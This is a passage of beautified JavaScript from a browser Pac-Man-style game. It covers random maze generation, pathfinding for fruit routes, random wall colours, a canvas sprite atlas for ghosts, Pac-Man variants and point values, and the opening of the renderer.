                if ((c = randomElement(doubleDeadEndCells)))
                  (c.connect[1] = !0),
                    (c.topTunnel = !0),
                    (c.next[2].topTunnel = !0);
                else if (
                  ((numTunnelsCreated = 1),
                  (c = randomElement(topVoidTunnelCells))
                    ? (c.topTunnel = !0)
                    : (c = randomElement(topSingleDeadEndCells))
                    ? selectSingleDeadEnd(c)
                    : (c = randomElement(topEdgeTunnelCells))
                    ? (c.topTunnel = !0)
                    : (numTunnelsCreated = 0),
                  (c = randomElement(botVoidTunnelCells)))
                )
                  c.topTunnel = !0;
                else if ((c = randomElement(botSingleDeadEndCells)))
                  selectSingleDeadEnd(c);
                else if ((c = randomElement(botEdgeTunnelCells)))
                  c.topTunnel = !0;
                else if (0 == numTunnelsCreated) return !1;
              for (y = 0; y < 9; y++)
                if ((c = cells[4 + 5 * y]).topTunnel) {
                  for (exit = !0, topy = c.final_y; c.next[3]; )
                    if ((c = c.next[3]).connect[0] || c.final_y != topy) {
                      exit = !1;
                      break;
                    }
                  if (exit) return !1;
                }
              var i,
                len = voidTunnelCells.length,
                replaceGroup = function (oldg, newg) {
                  var i, c;
                  for (i = 0; i < 45; i++)
                    (c = cells[i]).group == oldg && (c.group = newg);
                };
              for (i = 0; i < len; i++)
                (c = voidTunnelCells[i]).topTunnel ||
                  (replaceGroup(c.group, c.next[0].group),
                  (c.connect[0] = !0),
                  (c.next[0].connect[2] = !0));
              return !0;
            },
            joinWalls = function () {
              var x, y, c, c2;
              for (x = 0; x < 5; x++)
                (c = cells[x]).connect[3] ||
                  c.connect[1] ||
                  c.connect[0] ||
                  (c.connect[2] && c.next[2].connect[2]) ||
                  (c.next[3] && c.next[3].connect[0]) ||
                  !c.next[1] ||
                  c.next[1].connect[0] ||
                  (c.next[2] &&
                    c.next[2].connect[1] &&
                    c.next[2].next[1].connect[1]) ||
                  ((c.isJoinCandidate = !0),
                  Math.random() <= 0.25 && (c.connect[0] = !0));
              for (x = 0; x < 5; x++)
                (c = cells[x + 40]).connect[3] ||
                  c.connect[1] ||
                  c.connect[2] ||
                  (c.connect[0] && c.next[0].connect[0]) ||
                  (c.next[3] && c.next[3].connect[2]) ||
                  !c.next[1] ||
                  c.next[1].connect[2] ||
                  (c.next[0] &&
                    c.next[0].connect[1] &&
                    c.next[0].next[1].connect[1]) ||
                  ((c.isJoinCandidate = !0),
                  Math.random() <= 0.25 && (c.connect[2] = !0));
              for (y = 1; y < 8; y++)
                (c = cells[4 + 5 * y]).raiseHeight ||
                  c.connect[1] ||
                  c.connect[0] ||
                  c.connect[2] ||
                  c.next[0].connect[1] ||
                  c.next[2].connect[1] ||
                  (c.connect[3] &&
                    ((c2 = c.next[3]).connect[0] ||
                      c2.connect[2] ||
                      c2.connect[3] ||
                      ((c.isJoinCandidate = !0),
                      Math.random() <= 0.5 && (c.connect[1] = !0))));
            };
          reset(),
            gen(),
            !isDesirable() ||
              (setUpScaleCoords(), joinWalls(), !createTunnels());

        );
      }),
      (getShortestDistGraph = function (map, x0, y0, isNodeTile) {
        var x,
          y,
          i,
          j,
          graph = {};
        for (y = 0; y < 36; y++)
          for (x = 0; x < 28; x++)
            isNodeTile(x, y) &&
              ((graph[(i = x + 28 * y)] = {
                x: x,
                y: y,
                dist: 1 / 0,
                penult: void 0,
                neighbors: [],
                completed: !1,
              }),
              isNodeTile(x - 1, y) &&
                ((j = i - 1),
                graph[i].neighbors.push(graph[j]),
                graph[j].neighbors.push(graph[i])),
              isNodeTile(x, y - 1) &&
                ((j = i - 28),
                graph[i].neighbors.push(graph[j]),
                graph[j].neighbors.push(graph[i])));
        var d,
          next_node,
          min_dist,
          dist,
          node = graph[x0 + 28 * y0];
        for (node.completed = !0, node.dist = 0; ; ) {
          for (i = 0; i < 4; i++)
            (d = node.neighbors[i]) &&
              !d.completed &&
              ((dist = node.dist + 1) == d.dist
                ? Math.random() < 0.5 && (d.penult = node)
                : dist < d.dist && ((d.dist = dist), (d.penult = node)));
          for (next_node = void 0, min_dist = 1 / 0, i = 0; i < 1008; i++)
            (d = graph[i]) &&
              !d.completed &&
              d.dist < min_dist &&
              ((next_node = d), (min_dist = d.dist));
          if (!next_node) break;
          (node = next_node).completed = !0;
        }
        return graph;
      }),
      (getDirFromPenult = function (node) {
        if (node.penult) {
          var dx = node.x - node.penult.x,
            dy = node.y - node.penult.y;
          return -1 == dy
            ? 0
            : 1 == dy
            ? 2
            : -1 == dx
            ? 1
            : 1 == dx
            ? 3
            : void 0;
        }
      }),
      (reversed = {
        v: "^",
        "^": "v",
        "<": ">",
        ">": "<",
      }),
      (dirChars = {
        0: "^",
        2: "v",
        1: "<",
        3: ">",
      }),
      (getPathFromGraph = function (graph, x0, y0, x1, y1, reverse) {
        var node,
          start_node = graph[x0 + 28 * y0],
          path = "";
        for (node = graph[x1 + 28 * y1]; node != start_node; node = node.penult)
          path = dirChars[getDirFromPenult(node)] + path;
        return reverse
          ? (function (path) {
              var i,
                rpath = "";
              for (i = path.length - 1; i >= 0; i--) rpath += reversed[path[i]];
              return rpath;
            })(path)
          : path;
      }),
      (makeFruitPaths = function (map) {
        paths = {
          entrances: [],
          exits: [],
        };
        var isFloorTile = function (x, y) {
          return (
            !(x < 0 || x >= 28 || y < 0 || y >= 36) && map.isFloorTile(x, y)
          );
        };
        for (
          enter_graph = getShortestDistGraph(0, 15, 20, function (x, y) {
            return (14 != x || 20 != y) && isFloorTile(x, y);
          }),
            exit_graph = getShortestDistGraph(0, 16, 20, function (x, y) {
              return (17 != x || 20 != y) && isFloorTile(x, y);
            }),
            y = 0;
          y < 36;
          y++
        )
          map.isFloorTile(-1, y) &&
            (paths.entrances.push({
              start: {
                y: 8 * y + 4,
                x: -4,
              },
              path: ">" + getPathFromGraph(enter_graph, 15, 20, 0, y, !0),
            }),
            paths.entrances.push({
              start: {
                y: 8 * y + 4,
                x: 228,
              },
              path: "<" + getPathFromGraph(enter_graph, 15, 20, 27, y, !0),
            }),
            paths.exits.push({
              start: {
                y: 8 * y + 4,
                x: -4,
              },
              path: getPathFromGraph(exit_graph, 16, 20, 0, y, !1) + "<",
            }),
            paths.exits.push({
              start: {
                y: 8 * y + 4,
                x: 228,
              },
              path: getPathFromGraph(exit_graph, 16, 20, 27, y, !1) + ">",
            }));
        map.fruitPaths = paths;
      }),
      function () {
        genRandom();
        var map = new Map(
          28,
          36,
          (function () {
            var c,
              x0,
              y0,
              cl,
              cu,
              tiles = [],
              tileCells = [],
              setTile = function (x, y, v) {
                x < 0 ||
                  x > 15 ||
                  y < 0 ||
                  y > 30 ||
                  ((tiles[14 + (x -= 2) + 28 * y] = v),
                  (tiles[13 - x + 28 * y] = v));
              },
              getTile = function (x, y) {
                if (!(x < 0 || x > 15 || y < 0 || y > 30))
                  return tiles[14 + (x -= 2) + 28 * y];
              },
              setTileCell = function (x, y, cell) {
                x < 0 ||
                  x > 15 ||
                  y < 0 ||
                  y > 30 ||
                  (tileCells[(x -= 2) + 16 * y] = cell);
              },
              getTileCell = function (x, y) {
                if (!(x < 0 || x > 15 || y < 0 || y > 30))
                  return tileCells[(x -= 2) + 16 * y];
              };
            for (i = 0; i < 868; i++) tiles.push("_");
            for (i = 0; i < 496; i++) tileCells.push(void 0);
            for (i = 0; i < 45; i++)
              for (c = cells[i], x0 = 0; x0 < c.final_w; x0++)
                for (y0 = 0; y0 < c.final_h; y0++)
                  setTileCell(c.final_x + x0, c.final_y + 1 + y0, c);
            for (y = 0; y < 31; y++)
              for (x = 0; x < 16; x++)
                (c = getTileCell(x, y)),
                  (cl = getTileCell(x - 1, y)),
                  (cu = getTileCell(x, y - 1)),
                  c
                    ? ((cl && c.group != cl.group) ||
                        (cu && c.group != cu.group) ||
                        (!cu && !c.connect[0])) &&
                      setTile(x, y, ".")
                    : ((!cl || (cl.connect[1] && "." != getTile(x - 1, y))) &&
                        (!cu || (cu.connect[2] && "." != getTile(x, y - 1)))) ||
                      setTile(x, y, "."),
                  "." == getTile(x - 1, y) &&
                    "." == getTile(x, y - 1) &&
                    "_" == getTile(x - 1, y - 1) &&
                    setTile(x, y, ".");
            for (c = cells[4]; c; c = c.next[2])
              c.topTunnel &&
                ((y = c.final_y + 1), setTile(15, y, "."), setTile(14, y, "."));
            for (y = 0; y < 31; y++)
              for (x = 0; x < 16; x++)
                "." == getTile(x, y) ||
                  ("." != getTile(x - 1, y) &&
                    "." != getTile(x, y - 1) &&
                    "." != getTile(x + 1, y) &&
                    "." != getTile(x, y + 1) &&
                    "." != getTile(x - 1, y - 1) &&
                    "." != getTile(x + 1, y - 1) &&
                    "." != getTile(x + 1, y + 1) &&
                    "." != getTile(x - 1, y + 1)) ||
                  setTile(x, y, "|");
            setTile(2, 12, "-");
            var range,
              x = 14;
            (range = (function () {
              var miny,
                y,
                maxy = 15.5;
              for (y = 2; y < maxy; y++)
                if ("." == getTile(14, y) && "." == getTile(14, y + 1)) {
                  miny = y + 1;
                  break;
                }
              for (maxy = Math.min(maxy, miny + 7), y = miny + 1; y < maxy; y++)
                if ("." == getTile(13, y)) {
                  maxy = y - 1;
                  break;
                }
              return {
                miny: miny,
                maxy: maxy,
              };
            })()) &&
              ((y = getRandomInt(range.miny, range.maxy)), setTile(x, y, "o")),
              (range = (function () {
                var maxy,
                  y,
                  miny = 15.5;
                for (y = 28; y >= miny; y--)
                  if ("." == getTile(14, y) && "." == getTile(14, y + 1)) {
                    maxy = y;
                    break;
                  }
                for (
                  miny = Math.max(miny, maxy - 7), y = maxy - 1;
                  y > miny;
                  y--
                )
                  if ("." == getTile(13, y)) {
                    miny = y + 1;
                    break;
                  }
                return {
                  miny: miny,
                  maxy: maxy,
                };
              })()) &&
                ((y = getRandomInt(range.miny, range.maxy)),
                setTile(x, y, "o"));
            var i,
              j,
              y,
              eraseUntilIntersection = function (x, y) {
                for (
                  var adj;
                  (adj = []),
                    "." == getTile(x - 1, y) &&
                      adj.push({
                        x: x - 1,
                        y: y,
                      }),
                    "." == getTile(x + 1, y) &&
                      adj.push({
                        x: x + 1,
                        y: y,
                      }),
                    "." == getTile(x, y - 1) &&
                      adj.push({
                        x: x,
                        y: y - 1,
                      }),
                    "." == getTile(x, y + 1) &&
                      adj.push({
                        x: x,
                        y: y + 1,
                      }),
                    1 == adj.length;

                )
                  setTile(x, y, " "), (x = adj[0].x), (y = adj[0].y);
              };
            for (x = 15, y = 0; y < 31; y++)
              "." == getTile(x, y) && eraseUntilIntersection(x, y);
            for (setTile(1, 23, " "), i = 0; i < 7; i++) {
              for (
                setTile(i, (y = 17), " "), j = 1;
                "." == getTile(i, y + j) &&
                "|" == getTile(i - 1, y + j) &&
                "|" == getTile(i + 1, y + j);

              )
                setTile(i, y + j, " "), j++;
              for (
                setTile(i, (y = 11), " "), j = 1;
                "." == getTile(i, y - j) &&
                "|" == getTile(i - 1, y - j) &&
                "|" == getTile(i + 1, y - j);

              )
                setTile(i, y - j, " "), j++;
            }
            for (i = 0; i < 7; i++)
              for (
                setTile((x = 6), (y = 17 - i), " "), j = 1;
                "." == getTile(x + j, y) &&
                "|" == getTile(x + j, y - 1) &&
                "|" == getTile(x + j, y + 1);

              )
                setTile(x + j, y, " "), j++;
            return (
              "____________________________________________________________________________________" +
              tiles.join("") +
              "________________________________________________________"
            );
          })()
        );
        return (
          makeFruitPaths(map),
          (function (map) {
            var graph = getShortestDistGraph(
              0,
              map.doorTile.x,
              map.doorTile.y,
              function (x, y) {
                return (
                  !(x < 0 || x >= 28 || y < 0 || y >= 36) &&
                  map.isFloorTile(x, y)
                );
              }
            );
            map.getExitDir = function (x, y) {
              if (!(x < 0 || x >= 28 || y < 0 || y >= 36)) {
                var node = graph[x + 28 * y],
                  dirEnum = getDirFromPenult(node);
                return null != dirEnum ? rotateAboutFace(dirEnum) : void 0;
              }
            };
          })(map),
          (map.name = "Random Map"),
          (map.wallFillColor =
            "#" +
            ("00000" + ((Math.random() * (1 << 24)) | 0).toString(16)).slice(
              -6
            )),
          (map.wallStrokeColor = (function rgbString(rgb) {
            return (
              "rgb(" +
              Math.floor(rgb[0]) +
              "," +
              Math.floor(rgb[1]) +
              "," +
              Math.floor(rgb[2]) +
              ")"
            );
          })(
            (function hslToRgb(h, s, l) {
              var r, g, b;
              if (0 == s) r = g = b = l;
              else {
                function hue2rgb(p, q, t) {
                  return (
                    t < 0 && (t += 1),
                    t > 1 && (t -= 1),
                    t < 1 / 6
                      ? p + 6 * (q - p) * t
                      : t < 0.5
                      ? q
                      : t < 2 / 3
                      ? p + (q - p) * (2 / 3 - t) * 6
                      : p
                  );
                }
                var q = l < 0.5 ? l * (1 + s) : l + s - l * s,
                  p = 2 * l - q;
                (r = hue2rgb(p, q, h + 1 / 3)),
                  (g = hue2rgb(p, q, h)),
                  (b = hue2rgb(p, q, h - 1 / 3));
              }
              return [(r *= 255), (g *= 255), (b *= 255)];
            })(Math.random(), Math.random(), 0.4 * Math.random() + 0.6)
          )),
          (map.pelletColor = "#ffb8ae"),
          map
        );
      }),
    atlas = (function () {
      var canvas,
        ctx,
        creates = 0,
        copyCellTo = function (row, col, destCtx, x, y, display) {
          var sx = 22 * col * renderScale,
            sy = 22 * row * renderScale,
            sw = 22 * renderScale,
            sh = 22 * renderScale,
            dx = x - 11,
            dy = y - 11;
          display && console.log(sx, sy, sw, sh, 22, dy, 22, 22),
            destCtx.drawImage(canvas, sx, sy, sw, sh, dx, dy, 22, 22);
        },
        copyGhostSprite = function (
          destCtx,
          x,
          y,
          frame,
          dirEnum,
          scared,
          flash,
          eyes_only,
          color
        ) {
          var row, col;
          eyes_only
            ? ((row = 5), (col = dirEnum))
            : scared
            ? ((row = 5), (col = flash ? 6 : 4), (col += frame))
            : ((col = 2 * dirEnum + frame),
              (row =
                color == blinky.color
                  ? 1
                  : color == pinky.color
                  ? 2
                  : color == inky.color
                  ? 3
                  : color == clyde.color
                  ? 4
                  : 5)),
            copyCellTo(row, col, destCtx, x, y);
        },
        copyFruitSprite = function (destCtx, x, y, name) {
          copyCellTo(
            0,
            {
              cherry: 0,
              strawberry: 1,
              orange: 2,
              apple: 3,
              melon: 4,
              galaxian: 5,
              bell: 6,
              key: 7,
              pretzel: 8,
              pear: 9,
              banana: 10,
              cookie: 11,
              cookieface: 12,
            }[name],
            destCtx,
            x,
            y
          );
        };
      return {
        create: function () {
          !(function () {
            var canvas = document.getElementById("gridcanvas");
            if (canvas) {
              var w = 308 * renderScale,
                h = 484 * renderScale;
              (canvas.width = w), (canvas.height = h);
              var x,
                y,
                ctx = canvas.getContext("2d");
              ctx.clearRect(0, 0, w, h);
              var step = 22 * renderScale;
              for (ctx.beginPath(), x = 0; x <= w; x += step)
                ctx.moveTo(x, 0), ctx.lineTo(x, h);
              for (y = 0; y <= h; y += step) ctx.moveTo(0, y), ctx.lineTo(w, y);
              (ctx.lineWidth = "1px"),
                (ctx.lineCap = "square"),
                (ctx.strokeStyle = "rgba(255,255,255,0.5)"),
                ctx.stroke();
            }
          })(),
            (canvas = document.getElementById("atlas")),
            (ctx = canvas.getContext("2d"));
          var w = 308 * renderScale,
            h = 484 * renderScale;
          (canvas.width = w),
            (canvas.height = h),
            creates > 0 && ctx.restore(),
            creates++,
            ctx.save(),
            ctx.clearRect(0, 0, w, h),
            ctx.scale(renderScale, renderScale);
          var drawAtCell = function (f, row, col) {
              f(22 * col + 11, 22 * row + 11);
            },
            row = 0;
          drawAtCell(
            function (x, y) {
              drawCherry(ctx, x, y);
            },
            row,
            0
          ),
            drawAtCell(
              function (x, y) {
                drawStrawberry(ctx, x, y);
              },
              row,
              1
            ),
            drawAtCell(
              function (x, y) {
                drawOrange(ctx, x, y);
              },
              row,
              2
            ),
            drawAtCell(
              function (x, y) {
                drawApple(ctx, x, y);
              },
              row,
              3
            ),
            drawAtCell(
              function (x, y) {
                drawMelon(ctx, x, y);
              },
              row,
              4
            ),
            drawAtCell(
              function (x, y) {
                drawGalaxian(ctx, x, y);
              },
              row,
              5
            ),
            drawAtCell(
              function (x, y) {
                drawBell(ctx, x, y);
              },
              row,
              6
            ),
            drawAtCell(
              function (x, y) {
                drawKey(ctx, x, y);
              },
              row,
              7
            ),
            drawAtCell(
              function (x, y) {
                drawPretzel(ctx, x, y);
              },
              row,
              8
            ),
            drawAtCell(
              function (x, y) {
                drawPear(ctx, x, y);
              },
              row,
              9
            ),
            drawAtCell(
              function (x, y) {
                drawBanana(ctx, x, y);
              },
              row,
              10
            ),
            drawAtCell(
              function (x, y) {
                drawCookie(ctx, x, y);
              },
              row,
              11
            ),
            drawAtCell(
              function (x, y) {
                drawCookieFlash(ctx, x, y);
              },
              row,
              12
            );
          var drawGhostCells = function (row, color) {
            var i,
              f,
              col = 0;
            for (i = 0; i < 4; i++)
              for (f = 0; f < 2; f++)
                drawAtCell(
                  function (x, y) {
                    drawGhostSprite(ctx, x, y, f, i, !1, !1, !1, color);
                  },
                  row,
                  col
                ),
                  col++;
          };
          drawGhostCells(++row, "#FF0000"),
            drawGhostCells(++row, "#FFB8FF"),
            drawGhostCells(++row, "#00FFFF"),
            drawGhostCells(++row, "#FFB851"),
            row++,
            (function () {
              var i,
                col = 0;
              for (i = 0; i < 4; i++)
                drawAtCell(
                  function (x, y) {
                    drawGhostSprite(ctx, x, y, 0, i, !1, !1, !0, "#fff");
                  },
                  row,
                  col
                ),
                  col++;
            })(),
            drawAtCell(
              function (x, y) {
                drawGhostSprite(ctx, x, y, 0, 0, !0, !1, !1, "#fff");
              },
              row,
              4
            ),
            drawAtCell(
              function (x, y) {
                drawGhostSprite(ctx, x, y, 1, 0, !0, !1, !1, "#fff");
              },
              row,
              5
            ),
            drawAtCell(
              function (x, y) {
                drawGhostSprite(ctx, x, y, 0, 0, !0, !0, !1, "#fff");
              },
              row,
              6
            ),
            drawAtCell(
              function (x, y) {
                drawGhostSprite(ctx, x, y, 1, 0, !0, !0, !1, "#fff");
              },
              row,
              7
            );
          var drawPacCells = function (row, col, dir) {
            drawAtCell(
              function (x, y) {
                drawPacmanSprite(ctx, x, y, dir, Math.PI / 6);
              },
              row,
              col
            ),
              drawAtCell(
                function (x, y) {
                  drawPacmanSprite(ctx, x, y, dir, Math.PI / 3);
                },
                row,
                col + 1
              );
          };
          row++,
            drawAtCell(
              function (x, y) {
                drawPacmanSprite(ctx, x, y, 3, 0);
              },
              row,
              0
            ),
            (function () {
              var i,
                col = 1;
              for (i = 0; i < 4; i++) drawPacCells(row, col, i), (col += 2);
            })();
          var drawMsPacCells = function (row, col, dir) {
            drawAtCell(
              function (x, y) {
                drawMsPacmanSprite(ctx, x, y, dir, 0);
              },
              row,
              col
            ),
              drawAtCell(
                function (x, y) {
                  drawMsPacmanSprite(ctx, x, y, dir, 1);
                },
                row,
                col + 1
              ),
              drawAtCell(
                function (x, y) {
                  drawMsPacmanSprite(ctx, x, y, dir, 2);
                },
                row,
                col + 2
              );
          };
          row++,
            (function () {
              var i,
                col = 0;
              for (i = 0; i < 4; i++) drawMsPacCells(row, col, i), (col += 3);
            })();
          var drawCookieCells = function (row, col, dir) {
            drawAtCell(
              function (x, y) {
                drawCookiemanSprite(ctx, x, y, dir, 0, !0);
              },
              row,
              col
            ),
              drawAtCell(
                function (x, y) {
                  drawCookiemanSprite(ctx, x, y, dir, 1, !0);
                },
                row,
                col + 1
              ),
              drawAtCell(
                function (x, y) {
                  drawCookiemanSprite(ctx, x, y, dir, 2, !0);
                },
                row,
                col + 2
              );
          };
          row++,
            (function () {
              var i,
                col = 0;
              for (i = 0; i < 4; i++) drawCookieCells(row, col, i), (col += 3);
            })();
          var drawMonsterCells = function (row, color) {
            var i,
              f,
              col = 0;
            for (i = 0; i < 4; i++)
              for (f = 0; f < 2; f++)
                drawAtCell(
                  function (x, y) {
                    drawMonsterSprite(ctx, x, y, f, i, !1, !1, !1, color);
                  },
                  row,
                  col
                ),
                  col++;
          };
          drawMonsterCells(++row, "#FF0000"),
            drawMonsterCells(++row, "#FFB8FF"),
            drawMonsterCells(++row, "#00FFFF"),
            drawMonsterCells(++row, "#FFB851"),
            row++,
            (function () {
              var i,
                col = 0;
              for (i = 0; i < 4; i++)
                drawAtCell(
                  function (x, y) {
                    drawMonsterSprite(ctx, x, y, 0, i, !1, !1, !0, "#fff");
                  },
                  row,
                  col
                ),
                  col++;
            })(),
            drawAtCell(
              function (x, y) {
                drawMonsterSprite(ctx, x, y, 0, 0, !0, !1, !1, "#fff");
              },
              row,
              4
            ),
            drawAtCell(
              function (x, y) {
                drawMonsterSprite(ctx, x, y, 1, 0, !0, !1, !1, "#fff");
              },
              row,
              5
            ),
            drawAtCell(
              function (x, y) {
                drawMonsterSprite(ctx, x, y, 0, 0, !0, !0, !1, "#fff");
              },
              row,
              6
            ),
            drawAtCell(
              function (x, y) {
                drawMonsterSprite(ctx, x, y, 1, 0, !0, !0, !1, "#fff");
              },
              row,
              7
            );
          var drawOttoCells = function (row, col, dir) {
            var i;
            for (i = 0; i < 4; i++)
              drawAtCell(
                function (x, y) {
                  drawOttoSprite(ctx, x, y, dir, i);
                },
                row,
                col
              ),
                col++;
          };
          drawOttoCells(++row, 0, 0),
            drawOttoCells(row, 4, 3),
            drawOttoCells(++row, 0, 2),
            drawOttoCells(row, 4, 1),
            row++,
            drawAtCell(
              function (x, y) {
                drawPacPoints(ctx, x, y, 200, "#33ffff");
              },
              row,
              0
            ),
            drawAtCell(
              function (x, y) {
                drawPacPoints(ctx, x, y, 400, "#33ffff");
              },
              row,
              1
            ),
            drawAtCell(
              function (x, y) {
                drawPacPoints(ctx, x, y, 800, "#33ffff");
              },
              row,
              2
            ),
            drawAtCell(
              function (x, y) {
                drawPacPoints(ctx, x, y, 1600, "#33ffff");
              },
              row,
              3
            ),
            drawAtCell(
              function (x, y) {
                drawPacPoints(ctx, x, y, 100, "#ffb8ff");
              },
              row,
              4
            ),
            drawAtCell(
              function (x, y) {
                drawPacPoints(ctx, x, y, 300, "#ffb8ff");
              },
              row,
              5
            ),
            drawAtCell(
              function (x, y) {
                drawPacPoints(ctx, x, y, 500, "#ffb8ff");
              },
              row,
              6
            ),
            drawAtCell(
              function (x, y) {
                drawPacPoints(ctx, x, y, 700, "#ffb8ff");
              },
              row,
              7
            ),
            drawAtCell(
              function (x, y) {
                drawPacPoints(ctx, x, y, 1e3, "#ffb8ff");
              },
              row,
              8
            ),
            drawAtCell(
              function (x, y) {
                drawPacPoints(ctx, x, y, 2e3, "#ffb8ff");
              },
              row,
              9
            ),
            drawAtCell(
              function (x, y) {
                drawPacPoints(ctx, x, y, 3e3, "#ffb8ff");
              },
              row,
              10
            ),
            drawAtCell(
              function (x, y) {
                drawPacPoints(ctx, x, y, 5e3, "#ffb8ff");
              },
              row,
              11
            ),
            row++,
            drawAtCell(
              function (x, y) {
                drawMsPacPoints(ctx, x, y, 100, "#fff");
              },
              row,
              0
            ),
            drawAtCell(
              function (x, y) {
                drawMsPacPoints(ctx, x, y, 200, "#fff");
              },
              row,
              1
            ),
            drawAtCell(
              function (x, y) {
                drawMsPacPoints(ctx, x, y, 500, "#fff");
              },
              row,
              2
            ),
            drawAtCell(
              function (x, y) {
                drawMsPacPoints(ctx, x, y, 700, "#fff");
              },
              row,
              3
            ),
            drawAtCell(
              function (x, y) {
                drawMsPacPoints(ctx, x, y, 1e3, "#fff");
              },
              row,
              4
            ),
            drawAtCell(
              function (x, y) {
                drawMsPacPoints(ctx, x, y, 2e3, "#fff");
              },
              row,
              5
            ),
            drawAtCell(
              function (x, y) {
                drawMsPacPoints(ctx, x, y, 5e3, "#fff");
              },
              row,
              6
            ),
            row++,
            drawAtCell(
              function (x, y) {
                drawSnail(ctx, x, y, "#0ff");
              },
              row,
              0
            ),
            drawAtCell(
              function (x, y) {
                drawSnail(ctx, x, y, "#FFF");
              },
              row,
              1
            );
          var drawMsOttoCells = function (row, col, dir) {
            var i;
            for (i = 0; i < 4; i++)
              drawAtCell(
                function (x, y) {
                  drawMsOttoSprite(ctx, x, y, dir, i);
                },
                row,
                col
              ),
                col++;
          };
          drawMsOttoCells(++row, 0, 0),
            drawMsOttoCells(row, 4, 3),
            drawMsOttoCells(++row, 0, 2),
            drawMsOttoCells(row, 4, 1);
        },
        getCanvas: function () {
          return canvas;
        },
        drawGhostSprite: copyGhostSprite,
        drawMonsterSprite: function (
          destCtx,
          x,
          y,
          frame,
          dirEnum,
          scared,
          flash,
          eyes_only,
          color
        ) {
          var row, col;
          eyes_only
            ? ((row = 13), (col = dirEnum))
            : scared
            ? ((row = 13), (col = flash ? 6 : 4), (col += frame))
            : ((col = 2 * dirEnum + frame),
              (row =
                color == blinky.color
                  ? 9
                  : color == pinky.color
                  ? 10
                  : color == inky.color
                  ? 11
                  : color == clyde.color
                  ? 12
                  : 13)),
            copyCellTo(row, col, destCtx, x, y);
        },
        drawMuppetSprite: function (
          destCtx,
          x,
          y,
          frame,
          dirEnum,
          scared,
          flash,
          eyes_only,
          color
        ) {
          scared
            ? copyFruitSprite(destCtx, x, y, flash ? "cookieface" : "cookie")
            : copyGhostSprite(
                destCtx,
                x,
                y,
                frame,
                dirEnum,
                scared,
                flash,
                eyes_only,
                color
              );
        },
        drawOttoSprite: function (destCtx, x, y, dirEnum, frame) {
          var col, row;
          0 == dirEnum
            ? ((col = frame), (row = 14))
            : 3 == dirEnum
            ? ((col = frame + 4), (row = 14))
            : 2 == dirEnum
            ? ((col = frame), (row = 15))
            : 1 == dirEnum && ((col = frame + 4), (row = 15)),
            copyCellTo(row, col, destCtx, x, y);
        },
        drawMsOttoSprite: function (destCtx, x, y, dirEnum, frame) {
          var col, row;
          0 == dirEnum
            ? ((col = frame), (row = 19))
            : 3 == dirEnum
            ? ((col = frame + 4), (row = 19))
            : 2 == dirEnum
            ? ((col = frame), (row = 20))
            : 1 == dirEnum && ((col = frame + 4), (row = 20)),
            copyCellTo(row, col, destCtx, x, y);
        },
        drawPacmanSprite: function (destCtx, x, y, dirEnum, frame) {
          copyCellTo(
            6,
            0 == frame ? 0 : 2 * dirEnum + 1 + (frame - 1),
            destCtx,
            x,
            y
          );
        },
        drawMsPacmanSprite: function (destCtx, x, y, dirEnum, frame) {
          copyCellTo(7, 3 * dirEnum + frame, destCtx, x, y);
        },
        drawCookiemanSprite: function (destCtx, x, y, dirEnum, frame) {
          copyCellTo(8, 3 * dirEnum + frame, destCtx, x, y);
        },
        drawFruitSprite: copyFruitSprite,
        drawGhostPoints: function (destCtx, x, y, points) {
          var col = {
            200: 0,
            400: 1,
            800: 2,
            1600: 3,
          }[points];
          null != col && copyCellTo(16, col, destCtx, x, y);
        },
        drawPacFruitPoints: function (destCtx, x, y, points) {
          var col = {
            100: 4,
            300: 5,
            500: 6,
            700: 7,
            1e3: 8,
            2e3: 9,
            3e3: 10,
            5e3: 11,
          }[points];
          null != col && copyCellTo(16, col, destCtx, x, y);
        },
        drawMsPacFruitPoints: function (destCtx, x, y, points) {
          var col = {
            100: 0,
            200: 1,
            500: 2,
            700: 3,
            1e3: 4,
            2e3: 5,
            5e3: 6,
          }[points];
          null != col && copyCellTo(17, col, destCtx, x, y);
        },
        drawSnail: function (destCtx, x, y, frame) {
          copyCellTo(18, frame, destCtx, x, y);
        },
      };
    })(),
    initRenderer = function () {
      var bgCanvas,
        ctx,
        bgCtx,
        scale = 2;
      renderScale = scale;
      var resizeTimeout,
        resets = 0,
        getTargetScale = function () {
          var sx = (window.innerWidth - 10) / 290,
            sy = (window.innerHeight - 10) / 354,
            s = Math.min(sx, sy);
          return (s *= 1);
        },
        fullscreen = function () {
          (renderScale = scale = getTargetScale()),
            (canvas.width = 290 * scale),
            (canvas.height = 354 * scale),
            (canvas.style.width = canvas.width / 1),
            (canvas.style.height = canvas.height / 1),
            resets > 0 && ctx.restore(),
            ctx.save(),
            ctx.scale(scale, scale),
            (bgCanvas.width = 226 * scale),
            (bgCanvas.height = 290 * scale),
            resets > 0 && bgCtx.restore(),
            bgCtx.save(),
            bgCtx.scale(scale, scale),
            resets++,
            atlas.create(),
            renderer && renderer.drawMap(),
            center();
        },
        center = function () {
          var w = 290 * (getTargetScale() / 1);
          Math.max(0, (window.innerWidth - 10) / 2 - w / 2);
          (document.body.style.marginLeft = (window.innerWidth - w) / 2 + "px"),
            (document.getElementById("about-game").style.marginLeft =
              -(window.innerWidth - w) / 10 + "px");
        };
      (canvas = document.getElementById("canvas")),
        (bgCanvas = document.createElement("canvas")),
        (ctx = canvas.getContext("2d")),
        (bgCtx = bgCanvas.getContext("2d")),
        fullscreen(),
        window.addEventListener(
          "resize",
          function () {
            clearTimeout(resizeTimeout),
              (resizeTimeout = setTimeout(fullscreen, 100));
          },
          !1
        );
      var beginMapFrame = function () {
          (bgCtx.fillStyle = "#000"),
            bgCtx.fillRect(0, 0, 226, 290),
            bgCtx.translate(1, 1);
        },
        endMapFrame = function () {
          bgCtx.translate(-1, -1);
        },
        CommonRenderer = function () {
          (this.actorSize = 14),
            (this.energizerSize = 10),
            (this.pointsEarnedTextSize = 8),
            (this.energizerColor = "#FFF"),
            (this.pelletColor = "#888"),
            (this.flashLevel = !1);
        },
        SimpleRenderer = function () {
          CommonRenderer.call(this, ctx, bgCtx),
            (this.messageRow = 21.7),
            (this.pointsEarnedTextSize = 12),
            (this.backColor = "#222"),
            (this.floorColor = "#444"),
            (this.flashFloorColor = "#999"),
            (this.name = "Minimal");
        };
      SimpleRenderer.prototype = newChildObject(
        (CommonRenderer.prototype = {
          setOverlayColor: function (color) {
            this.overlayColor = color;
          },
          beginMapClip: function () {
            ctx.save(), ctx.beginPath(), ctx.rect(-1, -1, 225, 289), ctx.clip();
          },
          endMapClip: function () {
            ctx.restore();
          },
          beginFrame: function () {
            var p;
            this.setOverlayColor(void 0),
              ctx.save(),
              (ctx.fillStyle = "#000"),
              (p = 32),
